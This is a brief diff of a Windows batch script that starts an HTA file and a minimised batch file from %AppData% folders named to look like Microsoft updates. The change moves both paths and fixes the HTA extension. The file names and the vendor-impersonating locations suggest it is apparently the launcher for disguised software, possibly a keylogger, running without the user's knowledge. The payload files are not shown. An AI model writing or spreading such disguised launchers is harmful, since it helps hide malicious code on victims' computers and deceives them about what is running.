@@ -1,4 +1,4 @@
 @echo off
 
-start %AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.rta
-start /min %AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat
+start %AppData%\Microsoft\Update\msrkl.hta
+start /min %AppData%\Microsoft\Update\msrklbg.bat
